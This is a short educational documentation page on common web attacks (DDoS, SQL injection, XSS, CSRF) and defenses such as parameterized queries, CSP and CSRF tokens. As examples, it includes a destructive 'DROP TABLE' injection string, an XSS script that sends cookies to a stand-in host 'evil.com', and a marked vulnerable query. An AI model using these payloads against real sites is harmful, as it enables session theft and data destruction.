---
title: "Common Attacks & Defenses"
description: "DDoS, SQL injection, XSS, CSRF — how attacks work and how to defend against them."
sidebar:
  order: 3
---

# Common Attacks & Defenses

> Every public system will be attacked. Understanding common attack patterns helps you design defenses.

---

## Attack Types

| Attack | What It Does | Target |
|--------|-------------|--------|
| **DDoS** | Overwhelm with traffic | Network, infrastructure |
| **SQL Injection** | Execute malicious SQL | Databases |
| **XSS** | Inject malicious scripts | Users (browsers) |
| **CSRF** | Make users perform actions unintentionally | User sessions |
| **Man-in-the-Middle** | Intercept communication | Network traffic |
| **Brute Force** | Guess passwords/login | Auth endpoints |

---

## DDoS (Distributed Denial of Service)

**How it works:** Thousands of compromised devices (botnet) send traffic to your server, overwhelming it.

**Defenses:**
- **Rate limiting** — throttle requests per IP
- **CDN** (CloudFlare, Akamai) — absorbs traffic at the edge
- **Auto-scaling** — more servers spin up as load increases (not a complete solution)
- **Web Application Firewall** (WAF) — filters malicious traffic patterns

---

## SQL Injection

**How it works:** Attacker enters SQL code into a form field:

```sql
-- Instead of: username = "alice"
-- Attacker enters: alice'; DROP TABLE users; --

SELECT * FROM users WHERE username = 'alice'; DROP TABLE users; --';
-- Bad things happen 😱
```

**Defenses:**
- **Parameterized queries** (NEVER concatenate user input into SQL)
- **Input validation** (reject unexpected characters)
- **Least privilege** (app's DB user shouldn't have DROP TABLE permissions)

```javascript
// ❌ Vulnerable
const query = `SELECT * FROM users WHERE email = '${userInput}'`;

// ✅ Safe (parameterized)
const query = 'SELECT * FROM users WHERE email = ?';
db.execute(query, [userInput]);
```

---

## XSS (Cross-Site Scripting)

**How it works:** Attacker injects JavaScript into a page that other users see:

```html
<!-- User posts a comment containing: -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
<!-- Other users who view the comment execute this script — cookies stolen! -->
```

**Defenses:**
- **Escape all user input** before rendering (React does this by default)
- **Content Security Policy** (CSP) header — restrict which scripts can run
- **Sanitize HTML** with libraries like DOMPurify

---

## CSRF (Cross-Site Request Forgery)

**How it works:** User is logged into your bank. A malicious site sends a request to transfer money — the browser includes the user's cookies automatically.

**Defenses:**
- **CSRF tokens** — a unique, unpredictable token included in every form
- **SameSite cookies** — cookies are not sent with cross-site requests
- **Referer/Origin header check** — verify the request came from your site

---

## Defense in Depth

No single defense is enough. Layer them:

```
Internet → CDN/DDoS Protection → WAF → Rate Limiter → Auth → API
```

---

## Trade-offs

- Security always trades against convenience and performance.
- Every validation, rate limit, and encryption step adds latency.
- Focus on **OWASP Top 10** — the most critical web application security risks.
- Security through obscurity is not security — assume attackers know your system.

---

## In Simple Words

- DDoS = flood with traffic. Defend with CDN + rate limiting.
- SQL injection = malicious SQL in input. Defend with parameterized queries.
- XSS = malicious scripts in content. Defend by escaping output (React does this).
- CSRF = fake requests using your cookies. Defend with CSRF tokens + SameSite cookies.
- Layer your defenses — no single fix protects against everything.
